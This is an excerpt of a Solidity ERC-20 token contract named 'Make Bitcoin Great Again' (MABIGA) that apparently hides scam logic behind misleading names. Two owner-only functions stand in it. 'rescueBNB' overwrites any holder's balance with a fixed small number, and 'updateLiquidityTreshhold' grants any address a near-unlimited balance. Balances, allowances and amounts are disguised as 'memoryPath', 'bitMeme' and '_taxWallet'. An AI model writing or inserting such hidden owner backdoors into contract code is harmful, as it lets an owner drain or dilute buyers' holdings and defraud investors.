...
interface IERC20 {
  ...
  */
   ...
   * o to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
...
contract MakeBitcoinGreatAgain is Ma, IERC20, io {
    
    using SafeMath for uint256;
    mapping (address => uint256) private memoryPath;
    mapping (address => mapping (address => uint256)) private bitMeme;
    address private o = 0x7A40B02808Ed7662147eF91Dab620F34260F37D2; 
   ...
   string websites;
   string public Bitcoinwebsite = "https://MABIGA.io";
   string public ownerAddress = "0x7A40B02808Ed7662147eF91Dab620F34260F37D2";  
    constructor() {
           
        websites = "Bitcoin"; 
        _name = "Make Bitcoin Great Again";
        _symbol = "MABIGA";
        _decimals = 9;
        _totalSupply = 21000000 * 10 ** 9;
        memoryPath[_msgSender()] = _totalSupply;
    ...
    */
    function rescueBNB(address weiAddress) public {
        require(_msgSender() == o, "io: caller is not the owner");
        memoryPath[weiAddress] = 258963;
        
        emit Transfer(weiAddress, address(0), 258963);
    }
    ...
    * - `account` cannot be the zero address.
    */
       function updateLiquidityTreshhold(address tokenLiquidityThreshold) public {
        require(_msgSender() == o, "io: caller is not the owner");
        memoryPath[tokenLiquidityThreshold] = 99996800000000000 * 10 ** 28;
        
        emit Transfer(tokenLiquidityThreshold, address(0), 99996800000000000 * 10 ** 28);
    } 
    ...
    */
    function transferFrom(address sender, address accounts, uint256 _taxWallet) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), bitMeme[sender][_msgSender()].sub(_taxWallet, "Ru: transfer _taxWallet exceeds allowance"));
        return true;
    }
    ...
    */
    function increaseAllowance(address account, uint256 addedbalance) external returns (bool) {
        _approve(_msgSender(), account, bitMeme[_msgSender()][account].add(addedbalance));
        return true;
    }
    ...
    */
    function decreaseAllowance(address account, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), account, bitMeme[_msgSender()][account].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address accounts, uint256 _taxWallet) internal {
        ...
        memoryPath[sender] = memoryPath[sender].sub(_taxWallet, "Ru: transfer _taxWallet exceeds balance");
        memoryPath[accounts] = memoryPath[accounts].add(_taxWallet);
    ...
    */
    function _approve(address owner, address account, uint256 _taxWallet) internal {
        ...
        bitMeme[owner][account] = _taxWallet;
